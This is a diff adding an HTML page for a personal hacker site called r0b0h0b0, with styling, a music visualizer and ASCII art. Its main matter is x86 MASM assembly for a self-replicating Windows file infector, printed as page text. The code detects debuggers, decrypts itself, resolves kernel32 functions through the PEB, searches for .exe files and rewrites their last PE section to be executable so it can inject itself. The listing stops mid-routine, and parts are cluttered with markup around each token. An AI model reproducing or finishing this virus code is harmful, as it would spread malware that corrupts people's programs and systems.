@@ -1,0 +1,1083 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+ <meta name="robots" content="noai, noimageai">
+ <title>r0b0h0b0</title>
+ <link rel="shortcut icon" href="./img/favicon.ico" type="image/x-icon">
+<!-- The only know website with the glorious Peter De jong attractor -->
+ <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1, minimum-scale=1">
+ <meta name="description" content="">
+ <style type="text/css"><!--
+  @font-face {
+    font-family: "Bitstream Vera Sans Mono";
+    font-weight: normal;
+    src: url("./r0b0_files/veramono.ttf");
+  }
+  @font-face {
+    font-family: "Bitstream Vera Sans Mono";
+    font-weight: bold;
+    src: url("./r0b0_files/veramonobold.ttf");
+  }
+  body,pre,b { font-size: 10pt; line-height: 12pt;
+   font-family: "Bitstream Vera Sans Mono", Menlo, "Courier New", Courier, monospace }
+  b { font-weight: bold; color:#0F0; background:#000; position:relative; }
+  body { width: 50em; margin: 0.5em auto; overflow: hidden; }
+  pre { position:relative; }
+  a:hover { background:rgba(0,0,0,0.7); text-decoration:none;
+            border:1px solid #F00; margin:-17px; padding:16px;
+            position:relative; z-index:1; }
+ .c { height:2520pt; overflow:hidden; cursor:default; }
+  @media screen and (max-device-width: 480px) {
+   body { width: auto; margin: auto; }
+   pre { overflow-x: auto; -webkit-overflow-scrolling: touch; }
+  }
+  .circle
+{
+position: absolute;
+bottom: 0;
+width: 20px;
+aspect-ratio: 1/1;
+background: transparent;
+box-shadow: 0 0 10px #0f0,
+0 0 20px #0f0,
+0 0 30px #0f0,
+0 0 50px #0f0;
+border-radius: 50%;
+animation: animate 5s linear forwards;
+}
+@keyframes animate
+{
+0%
+{
+transform: translateY(0);
+opacity: 1;
+}
+50%
+{
+transform: translateY(0);
+opacity: 1;
+}
+100%
+{
+transform: translateY(-100vh);
+opacity: 0;
+}
+}
+.circle::before
+{
+content: '';
+position: absolute;
+top: 100%
+width: 50%
+height: 100vh;
+opacity: 0.5s;
+background: linear-gradient(#0f0,transparent);
+}
+.center {
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+}
+.left {
+  display: block;
+  margin-left: none;
+  margin-right: auto;
+}
+.right {
+  display: block;
+  margin-left: auto;
+  margin-right: none;
+}
+#thefile {
+  position: fixed;
+  top: 10px;
+  left: 10px;
+  z-index: 100;
+}
+
+#visualizer-container {
+  position: fixed;
+  bottom: 0; /* Pin to the bottom of the screen */
+  left: 50%;
+  transform: translateX(-50%);
+  width: 100%;
+  height: 60%;
+  overflow: hidden;
+  background-color: rgba(0, 0, 0, 0.1); 
+}
+
+#canvas {
+  width: 100%;
+  height: 100%;
+}
+
+
+audio {
+  position: fixed;
+  left: 10px;
+  bottom: 10px;
+  width: 1;
+}
+img {
+    display: inline-block;
+}
+.top-left-text {
+  position: absolute;
+  top: 20px; /* Adjust the top distance as needed */
+  left: 20px; /* Adjust the left distance as needed */
+  font-size: 18px; /* Font size */
+  font-family: Arial, sans-serif; /* Font family */
+}
+.top-right-text {
+  position: absolute;
+  top: 20px; /* Adjust the top distance as needed */
+  right: 20px; /* Adjust the left distance as needed */
+  font-size: 18px; /* Font size */
+  font-family: Arial, sans-serif; /* Font family */
+}
+/* Three image containers (use 25% for four, and 50% for two, etc) */
+.column {
+  padding: 5px;
+  display: inline-block;
+  margin: 0 auto;
+}
+
+/* Clear floats after image containers */
+.row::after {
+  content: "";
+  clear: both;
+  display: table;
+}
+iframe {
+            margin: 0;
+            padding: 0;
+            border: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+.background-iframe {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: -1; /* Set a lower z-index to move it to the background */
+  margin: 0;
+  padding: 0;
+  border: 0;
+  width: 100%;
+  height: 100%;
+}
+ -->
+ </style>
+  <div id="visualizer-container"><canvas id="canvas"></canvas></div>
+<script type="text/javascript" async="" src="./r0b0_files/js"></script></head>
+<body bgcolor="#000000" text="#00FF41" link="#FF0000" vlink="#44FF44" alink="#FFFFFF">
+  
+<div class="c">
+    <img src="./img/top.png" alt="logo" width=160 style="float: right; margin: 76px";><pre style="top: -2244pt;">
+	<pre>
+	                     
+						               
+									              
+												                
+																               
+																			               
+																						           
+																								   
+	</pre>
+														   
+                                                               <b style="top: 2244pt;"><a onclick="toggleMusic()"><big>♫</big></a></b>
+jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
+                                                             <b style="top: 2244pt;"><a href="https://github.com/elr0b0h0b0"target="_blank">hacks</a></b>
+jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
+                                                             <b style="top: 2244pt;"><a href="./about.html"target="_blank">about</a></b>
+jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
+                                                            <b style="top: 2244pt;"><a href="mailto:r0b0h0b0@proton.me"target="_blank"style='color: #0F0'>contact</a></b><b style="color: #FFFF00;"><pre>
+											    
+                                                           .=======.
+                                                           [<a>I N R I</a>]
+                                                           |       |
+                                                           |       |
+                                                  .========'       '========.
+                                                  |    _      xxxx      _    |
+                                                  |   /_;-.__ / _\  _.-;_\   |
+                                                  |      `-._`'`_/'`.-'      |
+                                                  '========. `\   /`========='
+                                                           |  |  / |
+                                                           | /-.(  |
+                                                           | \_._\ |
+                                                           |  \ \`;|
+                                                           |   > |/|
+                                                           |  / // |
+                                                           |  |//  |
+                                                           |  \(\  |
+                                                           |   ``  |
+                                                           |       |
+                                                           |       |
+                                                           |_______|
+                                                         <a>JESUS IS LORD</a></pre></b><b style="color: #FF0000;"><pre>
+                                                          .-""""""""-.                  
+                                                         /            \                 
+                                              _         |              |        _     
+                                             ( \        |,  .-.  .-.  ,|       / )    
+                                              > "=_     | )(__/  \__)( |    _=" <     
+                                             (_/"=_"=._ |/     /\     \| _="_="\_)    
+                                                   "=._"(_     ^^     _)"_="           
+                                                       "=\__|IIIIII|__/="               
+                                                       _="| \IIIIII/ |"=_              
+                                              _    _.="_="\          /"=_"=._    _    
+                                             ( \_="_.="    `--------`    "=._"=_/ )   
+                                              > _="                          "=_ <    
+                                             (_/                                \_)   </pre></b>
+<script>
+let audioCtx, analyser, canvas, ctx, dataArray, source;
+
+// Animation function
+function lines(){
+  let sizeW = Math.random() * 12;
+  let e = document.createElement('div');
+  e.setAttribute('class','circle');
+  document.body.appendChild(e);
+  e.style.width = 2+sizeW+'px';
+  e.style.left = Math.random() * + innerWidth + 'px';
+  setTimeout(function(){
+    document.body.removeChild(e)
+  },7000);
+}
+setInterval(lines, 100); // Run animation continuously
+
+function toggleMusic() {
+  if (!audioCtx || !audioCtx.state || audioCtx.state === 'closed') {
+    audioCtx = new AudioContext();
+    analyser = audioCtx.createAnalyser();
+    canvas = document.createElement("canvas");
+
+    // Get the #visualizer-container element
+    const visualizerContainer = document.getElementById("visualizer-container");
+
+    // Clear any existing content in the container
+    visualizerContainer.innerHTML = "";
+
+    // Append the canvas to the #visualizer-container
+    visualizerContainer.appendChild(canvas);
+
+    ctx = canvas.getContext("2d");
+    canvas.width = visualizerContainer.offsetWidth;  // Set canvas width to container width
+    canvas.height = visualizerContainer.offsetHeight;  // Set canvas height to container height
+
+    analyser.fftSize = 256;
+    let bufferLength = analyser.frequencyBinCount;
+    dataArray = new Uint8Array(bufferLength);
+    analyser.connect(audioCtx.destination);
+    source = audioCtx.createMediaElementSource(new Audio("./theme.mp3"));
+    source.connect(analyser);
+    source.mediaElement.play();
+    renderFrame();
+  } else {
+    source.mediaElement.pause();
+    audioCtx.close().then(() => {
+      // Remove the canvas from the #visualizer-container
+      document.getElementById("visualizer-container").removeChild(canvas);
+    }).catch((err) => console.error(err));
+  }
+}
+function renderFrame() {
+  requestAnimationFrame(renderFrame);
+  analyser.getByteFrequencyData(dataArray);
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+  let containerWidth = document.getElementById('visualizer-container').offsetWidth;
+  let containerHeight = document.getElementById('visualizer-container').offsetHeight;
+  let barWidth = (containerWidth / dataArray.length) * 1.0;
+  let centerX = containerWidth / 2;
+  let scaleFactor = containerHeight / 256; // Adjust this value for scaling
+
+  ctx.fillStyle = "#3A3B3C";
+
+  let x = centerX - barWidth - 1;
+  for (let i = 0; i < dataArray.length / 2; i++) {
+    let barHeight = dataArray[i] * scaleFactor;
+    ctx.fillRect(x, containerHeight - barHeight, barWidth, barHeight);
+    x -= barWidth + 1;
+  }
+
+  x = centerX;
+  for (let i = 0; i < dataArray.length / 2; i++) {
+    let barHeight = dataArray[i] * scaleFactor;
+    ctx.fillRect(x, containerHeight - barHeight, barWidth, barHeight);
+    x += barWidth + 1;
+  }
+}
+</script>
+.386
+.model flat, stdcall
+option casemap:none
+
+    include \masm32\include\windows.inc
+    include \masm32\include\wdm.inc
+    include \masm32\include\kernel32.inc
+    include \masm32\include\user32.inc
+    include .\r0b0h0b0.inc
+    includelib \masm32\lib\kernel32.lib
+
+.code
+
+start_of_code:
+    call decryptor_get_eip
+    decryptor_get_eip:
+	pop edx
+    sub edx, 5
+    push edx ; save it
+    push eax
+    pop eax
+    lea esi, [edx + (data - start_of_code)]
+    
+    push eax
+    pop eax
+    ; check for debugger
+    ASSUME FS:NOTHING
+    mov edx, fs:[30h]
+    ASSUME FS:ERROR
+    cmp (PEB PTR [edx]).BeingDebugged, 0
+    push eax
+    pop eax
+    nop
+    jne end_of_code
+    nop 
+    cypt_key:
+    mov edx, 00000000h
+    xor ecx, ecx
+    decryptor_loop_b:
+    cmp ecx, (end_of_code - data)
+    je decryptor_loop_e
+    mov al, [esi + ecx]
+    xor al, dl
+    nop
+    mov [esi + ecx], al
+    push eax
+    pop eax
+    inc ecx
+    nop
+    ror edx, cl
+    jmp decryptor_loop_b
+    decryptor_loop_e:
+    pop eax ; start_of_code address
+    mov ebp, esp ; reset ebp
+    nop
+    lea eax, [eax + (start - start_of_code)]
+    jmp eax
+
+PopUp proc
+
+    LOCAL pMem  :DWORD
+
+    push ebx
+    push esi
+    push edi
+
+    mov pMem, 29
+
+<a>mov</a> <a>esi</a>, <a>pMem</a>
+
+    <a>mov</a> <a>DWORD</a> <a>PTR</a> [<a>esi</a>+0], <a>3527344145</a>
+    <a>mov</a> <a>DWORD</a> <a>PTR</a> [<a>esi</a>+4], <a>1053247386</a>
+    <a>mov</a> <a>DWORD</a> <a>PTR</a> [<a>esi</a>+8], <a>3139946680</a>
+    <a>mov</a> <a>DWORD</a> <a>PTR</a> [<a>esi</a>+12], <a>2011744531</a>
+    <a>mov</a> <a>DWORD</a> <a>PTR</a> [<a>esi</a>+16], <a>3925728362</a>
+    <a>mov</a> <a>DWORD</a> <a>PTR</a> [<a>esi</a>+20], <a>1185816795</a>
+    <a>mov</a> <a>DWORD</a> <a>PTR</a> [<a>esi</a>+24], <a>1387125627</a>
+
+    <a>mov</a> <a>edi</a>, 28
+    <a>or</a> <a>ebx</a>, -1
+
+  <a>@@:</a>
+    <a>add</a> <a>ebx</a>, 1
+    <a>movzx</a> <a>edx</a>, <a>BYTE</a> <a>PTR</a> [<a>PopUp_pad</a>+<a>ebx</a>]
+    <a>xor</a> [<a>esi</a>+<a>ebx</a>], <a>dl</a>
+    <a>sub</a> <a>edi</a>, 1
+    <a>jnz</a> @B
+
+    <a>mov</a> <a>eax</a>, <a>pMem</a>
+    <a>mov</a> <a>ecx</a>, 28
+
+    <a>pop</a> <a>edi</a>
+    <a>pop</a> <a>esi</a>
+    <a>pop</a> <a>ebx</a>
+
+    <a>ret</a>
+
+   <a>.data</a>
+   <a>PopUp_pad</a> \
+    <a>db</a> <a>97,119,81,183,254,103,165,71,152,172,70,155,97,249,138,71</a>
+    <a>db</a> <a>2,236,159,217,245,0,253,46,19,179,197,115</a>
+   <a>.code</a>
+
+   <a>PopUp</a> <a>endp</a>
+
+   ; <a>ret</a> : <a>function</a> <a>address</a>
+   ; <a>arg1</a>: <a>function</a> <a>name</a>
+   ; <a>arg2</a>: <a>STACK_STORAGE</a> <a>struct</a>
+   <a>GetProcAddr</a>:
+    <a>pop</a> <a>eax</a> ; <a>ret</a>
+    <a>nop</a>
+    <a>pop</a> <a>ecx</a> ; <a>arg1</a>
+    <a>nop</a>
+    <a>pop</a> <a>edx</a> ; <a>arg2</a>
+    <a>nop</a>
+    <a>push</a> <a>eax</a>
+    <a>push</a> <a>ecx</a>
+    <a>push</a> (<a>STACK_STORAGE</a> <a>PTR</a> [<a>edx</a>]).<a>GetProcAddress_module</a>
+    <a>nop</a>
+    <a>call</a> (<a>STACK_STORAGE</a> <a>PTR</a> [<a>edx</a>]).<a>GetProcAddress_addr</a>
+    <a>pop</a> <a>edx</a>
+    <a>nop</a>
+    <a>jmp</a> <a>edx</a>
+
+   ; <a>ret</a> : <a>none</a>
+   ; <a>arg1</a>: <a>file</a> <a>size</a>
+   ; <a>arg2</a>: <a>STACK_STORAGE</a> <a>struct</a>
+   <a>MapFileToRAM</a>:
+    ; <a>use</a> <a>of</a> <a>offsets</a> <a>on</a> <a>esp</a>, <a>because</a> <a>the</a> <a>arguments</a>
+    ; <a>and</a> <a>return</a> <a>address</a> <a>are</a> <a>on</a> <a>the</a> <a>stack</a>
+    <a>push</a> [esp + (<a>sizeof</a> <a>DWORD</a> * 2)]
+    <a>nop</a>
+    <a>lea</a> <a>eax</a>, [<a>ebx</a> + (<a>CreateFileMapping_str</a> - <a>data</a>)]
+    <a>nop</a>
+    <a>push</a> <a>eax</a>
+    <a>call</a> <a>GetProcAddr</a>
+    <a>mov</a> <a>edx</a>, [esp + (<a>sizeof</a> <a>DWORD</a> * 2)]
+    <a>nop</a>
+    <a>mov</a> <a>edx</a>, (<a>STACK_STORAGE</a> <a>PTR</a> [<a>edx</a>]).<a>fileHandle</a>
+    <a>nop</a>
+    <a>mov</a> <a>ecx</a>, [esp + (<a>sizeof</a> <a>DWORD</a> * 1)]
+    <a>nop</a>
+    <a>push</a> <a>NULL</a>
+    <a>push</a> <a>ecx</a>
+    <a>push</a> 0
+    <a>push</a> <a>ebx</a>
+    <a>nop</a>
+    <a>push</a> <a>esi</a>
+    <a>push</a> <a>edi</a>
+    <a>pop</a> <a>edi</a>
+    <a>pop</a> <a>esi</a>
+    <a>pop</a> <a>ebx</a>
+
+    <a>push</a> <a>PAGE_READWRITE</a>
+    <a>push</a> <a>NULL</a>
+    <a>nop</a>
+    <a>push</a> <a>edx</a>
+    <a>call</a> <a>eax</a> ; <a>CreateFileMapping()</a>
+    <a>mov</a> <a>edx</a>, [esp + (<a>sizeof</a> <a>DWORD</a> * 2)]
+    <a>mov</a> (<a>STACK_STORAGE</a> <a>PTR</a> [<a>edx</a>]).<a>fileMappingHandle</a>, <a>eax</a>
+    <a>nop</a>
+    <a>push</a> [esp + (<a>sizeof</a> <a>DWORD</a> * 2)]
+    <a>lea</a> <a>eax</a>, [<a>ebx</a> + (<a>MapViewOfFile_str</a> - <a>data</a>)]
+    <a>push</a> <a>eax</a>
+    <a>call</a> <a>GetProcAddr</a>
+    <a>mov</a> <a>edx</a>, [esp + (<a>sizeof</a> <a>DWORD</a> * 2)]
+    <a>mov</a> <a>edx</a>, (<a>STACK_STORAGE</a> <a>PTR</a> [<a>edx</a>]).<a>fileMappingHandle</a>
+    <a>nop</a>
+    <a>push</a> 0
+    <a>push</a> 0
+    <a>push</a> 0
+    <a>nop</a>
+    <a>push</a> (<a>FILE_MAP_WRITE</a> or <a>FILE_MAP_READ</a>)
+    <a>push</a> <a>edx</a>
+    <a>call</a> <a>eax</a> ; <a>MapViewOfFile()</a>
+    <a>mov</a> <a>edx</a>, [esp + (<a>sizeof</a> <a>DWORD</a> * 2)]
+    <a>mov</a> (<a>STACK_STORAGE</a> <a>PTR</a> [<a>edx</a>]).<a>fileView</a>, <a>eax</a>
+    <a>pop</a> <a>edx</a>
+    <a>pop</a> <a>ecx</a>
+    <a>pop</a> <a>ecx</a>
+    <a>jmp</a> <a>edx</a>
+
+   ; <a>ret</a> : <a>none</a>
+   ; <a>arg1</a>: <a>STACK_STORAGE</a> <a>struct</a>
+   <a>UnmapFileFromRAM</a>:
+    <a>push</a> [esp + (<a>sizeof</a> <a>DWORD</a> * 1)]
+    <a>nop</a>
+    <a>nop</a>
+    <a>lea</a> <a>eax</a>, [<a>ebx</a> + (<a>UnmapViewOfFile_str</a> - <a>data</a>)]
+    <a>push</a> <a>eax</a>
+    <a>call</a> <a>GetProcAddr</a>
+    <a>mov</a> <a>edx</a>, [esp + (<a>sizeof</a> <a>DWORD</a> * 1)]
+    <a>nop</a>
+    <a>push</a> (<a>STACK_STORAGE</a> <a>PTR</a> [<a>edx</a>]).<a>fileView</a>
+    <a>nop</a>
+    <a>nop</a>
+    <a>call</a> <a>eax</a> ; <a>UnmapViewOfFile()</a>
+    <a>nop</a>
+    <a>push</a> [esp + (<a>sizeof</a> <a>DWORD</a> * 1)]
+    <a>nop</a>
+    <a>lea</a> <a>eax</a>, [<a>ebx</a> + (<a>CloseHandle_str</a> - <a>data</a>)]
+    <a>push</a> <a>eax</a>
+    <a>call</a> <a>GetProcAddr</a>
+    <a>mov</a> <a>edx</a>, [esp + (<a>sizeof</a> <a>DWORD</a> * 1)]
+    <a>nop</a>
+    <a>nop</a>
+    <a>push</a> (<a>STACK_STORAGE</a> <a>PTR</a> [<a>edx</a>]).<a>fileMappingHandle</a>
+    <a>call</a> <a>eax</a> ; <a>CloseHandle()</a>
+    <a>pop</a> <a>edx</a>
+    <a>pop</a> <a>ecx</a>
+    <a>jmp</a> <a>edx</a>
+
+; ret : bool
+; arg1: string1
+; arg2: string2
+; arg3: length
+lstrncmp:
+    xor esi, esi ; string offset
+    nop
+    xor eax, eax
+    
+lstrncmp_loop:
+    cmp esi, [esp + (sizeof DWORD * 3)]
+    nop
+    je lstrncmp_end_equal
+    nop
+    mov ecx, [esp + (sizeof DWORD * 1)]
+    nop
+    mov cl, [ecx + esi]
+    mov edx, [esp + (sizeof DWORD * 2)]
+    nop
+    mov dl, [edx + esi]
+    nop
+    cmp cl, dl
+    jne lstrncmp_end_not_equal
+    inc esi
+    nop
+    jmp lstrncmp_loop
+    
+lstrncmp_end_equal:
+    mov al, 1
+    nop
+    jmp lstrncmp_end
+    
+lstrncmp_end_not_equal:
+    mov al, 0
+    nop
+    
+lstrncmp_end:
+    pop edx
+    nop
+    pop ecx
+    pop ecx
+    nop
+    pop ecx
+    nop
+    jmp edx
+
+start:
+    call get_eip ; get the injected exe env instruction pointer
+    push ebx
+    push esi
+    push edi
+    pop edi
+    pop esi
+    pop ebx
+
+get_eip:
+    pop ebx
+    ; ebx holds "data section" address
+    ; (call instruction + (start label address - data label instruction))
+    nop
+    sub ebx, (5 + (start - data))
+    push ebx ; save it back temporarily
+    ; resolve kernel32 base address
+    ASSUME FS:NOTHING
+    mov edx, fs:[30h] ; get the PEB struct
+    nop
+    ASSUME FS:ERROR
+    ; ->Ldr / get the PEB_LDR_DATA struct
+    mov edx, (PEB PTR [edx]).Ldr
+    ; ->InMemoryOrderModuleList / gets the loaded modules linked list
+    lea edx, (PEB_LDR_DATA PTR [edx]).InMemoryOrderModuleList
+    nop
+    ; loop through the linked list until we match with "KERNEL32.DLL"
+    ; partial case insensitive check : length=12; name[0]=K; name[5]=L; name[6]=3; name[7]=2
+    ; enough because KERNEL32 should always be before some other DLL matching this pattern
+
+loop_find_kernel32:
+    ; ->FullDllName / get the UNICODE_STRING struct
+    lea eax, (LDR_DATA_TABLE_ENTRY PTR [edx]).FullDllName
+    ; ->Len
+    mov bx, (UNICODE_STRING PTR [eax]).Len
+    nop
+    ; check the length
+    cmp bx, (12 * sizeof WCHAR)
+    jne loop_find_kernel32_continue
+    nop
+    ; ->Buffer
+    mov eax, (UNICODE_STRING PTR [eax]).Buffer
+    ; check the string
+    xor edi, edi
+    mov bx, [eax]
+    mov di, 'K'
+    nop
+    cmp bx, 'a' ; check case
+    jl lfk32_first_letter_cmp
+    add di, ('a' - 'A') ; make lowercase
+
+lfk32_first_letter_cmp:
+    cmp bx, di
+    jne loop_find_kernel32_continue
+    nop
+    mov bx, [eax + 5 * sizeof WCHAR]
+    mov di, 'L'
+    nop
+    cmp bx, 'a'
+    jl lfk32_second_letter_cmp
+    add di, ('a' - 'A')
+
+lfk32_second_letter_cmp:
+    cmp bx, di
+    jne loop_find_kernel32_continue
+    mov ebx, [eax + 6 * sizeof WCHAR]
+    nop
+    cmp ebx, 00320033h ; "32" in little endian wide characters
+    nop
+    jne loop_find_kernel32_continue
+    jmp loop_find_kernel32_end
+
+loop_find_kernel32_continue:
+    ; (LIST_ENTRY)->Flink / get next loaded module
+    mov edx, (LIST_ENTRY PTR [edx]).Flink
+    nop
+    jmp loop_find_kernel32
+
+loop_find_kernel32_end:
+    ; ->DllBase, for some reason, does not hold the base address
+    ; instead ->Reserved2[0] does
+    mov ebx, (LDR_DATA_TABLE_ENTRY PTR [edx]).Reserved2[0 * sizeof PVOID]
+    nop
+    mov edx, ebx
+    ; get PE header (base address + offset from the DOS header)
+    add edx, [edx + 03Ch]
+    nop
+    ; get export table
+    mov edx, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edx]).OptionalHeader) \
+	        .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT * sizeof IMAGE_OPTIONAL_HEADER] \
+			.VirtualAddress
+    add edx, ebx
+    push edx ; save export table on the stack
+    ; get function names array
+    mov edx, [edx + 020h] ; AddressOfNames
+    nop
+    add edx, ebx
+    nop
+    xor ecx, ecx ; index = 0
+    ; loop trough export function names
+
+loop_find_gpa:
+    mov eax, [edx + ecx]
+    add eax, ebx
+    ; check the string with "GetProcA", should be enough
+    ; in reverse because of the endianness
+    mov edi, [eax]
+    nop
+    cmp edi, 'PteG'
+    nop
+    jne loop_find_gpa_continue
+    mov edi, [eax + 4]
+    nop
+    cmp edi, 'Acor'
+    jne loop_find_gpa_continue
+    jmp loop_find_gpa_end
+
+loop_find_gpa_continue:
+    add ecx, sizeof LPSTR ; index += 1
+    nop
+    jmp loop_find_gpa
+
+loop_find_gpa_end:
+    pop edx ; get the export table back
+    nop
+    mov eax, edx
+    ; now use this index to find the function ordinal (address array index)
+    mov edx, [edx + 024h] ; AddressOfNameOrdinals
+    add edx, ebx
+    shr ecx, 1 ; index /= 2 (32 bit array -> 16 bit array)
+    xor edi, edi
+    nop
+    nop
+    nop
+    mov di, [edx + ecx]
+    shl edi, 2 ; index *= 4 (sizeof PVOID)
+    mov edx, eax
+    ; now use the ordinal to get the function address
+    mov edx, [edx + 01Ch] ; AddressOfFunctions
+    add edx, ebx
+    nop
+    nop
+    mov ecx, [edx + edi]
+    add ecx, ebx
+    nop
+    mov edi, ebx ; save kernel32 base address
+    ; check STACK_STORAGE DWORD (4 bytes) alignment
+    xor edx, edx
+    mov ax, sizeof STACK_STORAGE
+    mov bx, 4
+    div bx
+    nop
+    add dx, sizeof STACK_STORAGE
+    pop ebx
+    nop
+    ; allocate space on the stack, sp register instead of esp because
+    ; the structure size fits in a WORD, saves on instruction size
+    sub sp, dx
+    ; store GetProcAddress address
+    mov (STACK_STORAGE PTR [esp]).GetProcAddress_addr, ecx
+    ; store kernel32 base address
+    nop
+    mov (STACK_STORAGE PTR [esp]).kernel32BaseAddr, edi
+    ; set it as module for GetProcAddress
+    nop
+    mov (STACK_STORAGE PTR [esp]).GetProcAddress_module, edi
+    ; set actual struct size on stack
+    nop
+    mov (STACK_STORAGE PTR [esp]).alignedSize, dx
+    push esp
+    lea eax, [ebx + (FindFirstFile_str - data)]
+    push eax
+    call GetProcAddr
+    mov (STACK_STORAGE PTR [esp]).fileQueryHandle, INVALID_HANDLE_VALUE
+    nop
+    lea edx, (STACK_STORAGE PTR [esp]).fileStruct
+    push edx
+    lea edx, [ebx + (fileQuery - data)]
+    push edx
+    call eax ; FindFirstFile()
+    cmp eax, INVALID_HANDLE_VALUE
+    nop
+    je loop_find_file_end
+    mov (STACK_STORAGE PTR [esp]).fileQueryHandle, eax
+    nop
+
+loop_find_file:
+    push esp
+    lea eax, [ebx + (GetFullPathName_str - data)]
+    push eax
+    call GetProcAddr
+    ; check file and put it on the stack if needed
+    lea edx, (STACK_STORAGE PTR [esp]).fileName
+    lea ecx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).cFileName
+    push NULL
+    push edx
+    push MAX_PATH
+    push ecx
+        nop
+    nop
+    nop
+    call eax ; GetFullPathName() / get absolute file path
+    ; check if it actually ends with .exe
+    push esp
+    lea eax, [ebx + (lstrlen_str - data)]
+    push eax
+    call GetProcAddr
+    lea edx, (STACK_STORAGE PTR [esp]).fileName
+    push edx
+    call eax
+    ; get to the end of the name, expecting ".exe"
+    lea edx, (STACK_STORAGE PTR [esp]).fileName[eax - 4]
+    mov edx, [edx]
+    cmp edx, 'exe.' ; (little endian)
+    jne loop_find_file_continue
+    ; check if it's a directory
+    mov edx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).dwFileAttributes
+    and edx, FILE_ATTRIBUTE_DIRECTORY
+        nop
+    nop
+    nop
+    cmp edx, FILE_ATTRIBUTE_DIRECTORY
+    je loop_find_file_continue
+    ; check if it's a read-only file
+    mov edx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).dwFileAttributes
+    and edx, FILE_ATTRIBUTE_READONLY
+    cmp edx, FILE_ATTRIBUTE_READONLY
+        nop
+    nop
+    nop
+    je loop_find_file_continue
+    ; Target appears good
+    push esp
+    lea eax, [ebx + (CreateFile_str - data)]
+    push eax
+    call GetProcAddr
+    lea edx, (STACK_STORAGE PTR [esp]).fileName
+    push NULL
+    push FILE_ATTRIBUTE_NORMAL
+    push OPEN_EXISTING
+    push NULL
+    push (FILE_SHARE_READ or FILE_SHARE_WRITE)
+    push (GENERIC_READ or GENERIC_WRITE)
+    push edx
+        nop
+    nop
+    nop
+    call eax ; CreateFile()
+    cmp eax, INVALID_HANDLE_VALUE
+    je loop_find_file_continue ; if handle != null
+    mov (STACK_STORAGE PTR [esp]).fileHandle, eax
+    push esp
+    push 0
+    call MapFileToRAM
+    ; get PE header (base address + offset from the DOS header)
+    mov edi, (STACK_STORAGE PTR [esp]).fileView
+    add edi, [edi + 03Ch]
+    ; check if executable
+    mov ax, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).Characteristics
+    and ax, IMAGE_FILE_EXECUTABLE_IMAGE
+    cmp ax, IMAGE_FILE_EXECUTABLE_IMAGE
+    jne close_target
+        nop
+    nop
+    nop
+    ; check if 32 bit
+    mov ax, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).Machine
+    cmp ax, IMAGE_FILE_MACHINE_I386
+    jne close_target
+    ; get sections count
+    xor ecx, ecx
+    mov cx, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).NumberOfSections
+    dec ecx
+    ; get last section header
+    mov eax, sizeof IMAGE_SECTION_HEADER
+    mul ecx ; eax = (sizeof IMAGE_SECTION_HEADER * NumberOfSections)
+    lea edx, (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader
+        nop
+    nop
+    nop
+    add dx, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).SizeOfOptionalHeader
+    mov ecx, edx ; save first section header
+    add edx, eax
+    mov (STACK_STORAGE PTR [esp]).filePeHeader, edi
+    mov (STACK_STORAGE PTR [esp]).fileLastSectionHeader, edx
+    ; check if itself
+    mov eax, ebx
+    add eax, (start - data)
+    ; get physical entry point address
+    sub ecx, sizeof IMAGE_SECTION_HEADER
+
+find_entrypoint_section_loop:
+    add ecx, sizeof IMAGE_SECTION_HEADER
+    mov edx, (IMAGE_SECTION_HEADER PTR [ecx]).VirtualAddress
+    add edx, (IMAGE_SECTION_HEADER PTR [ecx]).Misc
+    cmp edx, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).AddressOfEntryPoint
+    jl find_entrypoint_section_loop
+    mov edx, (IMAGE_SECTION_HEADER PTR [ecx]).VirtualAddress
+    sub edx, (IMAGE_SECTION_HEADER PTR [ecx]).PointerToRawData
+    mov ecx, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).AddressOfEntryPoint
+    add ecx, (STACK_STORAGE PTR [esp]).fileView
+    sub ecx, edx
+    push end_of_code - start
+    push ecx
+    push eax
+    call lstrncmp
+    cmp al, 0
+    jne close_target
+    mov edi, (STACK_STORAGE PTR [esp]).filePeHeader
+    nop
+    mov edx, (STACK_STORAGE PTR [esp]).fileLastSectionHeader
+    nop
+    mov eax, (IMAGE_SECTION_HEADER PTR [edx]).Characteristics
+    ; set as executable code & writeable
+    or eax, (IMAGE_SCN_MEM_EXECUTE OR IMAGE_SCN_CNT_CODE OR IMAGE_SCN_MEM_WRITE)
+    ; set as not discardable
+    mov ecx, IMAGE_SCN_MEM_DISCARDABLE
+    not ecx
+    and eax, ecx
+    ; update it
+    mov (IMAGE_SECTION_HEADER PTR [edx]).Characteristics, eax
+    ; update VirtualSize
+    mov eax, (IMAGE_SECTION_HEADER PTR [edx]).Misc
+    add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SectionAlignment
+    mov (IMAGE_SECTION_HEADER PTR [edx]).Misc, eax
+    ; save where to inject in the target
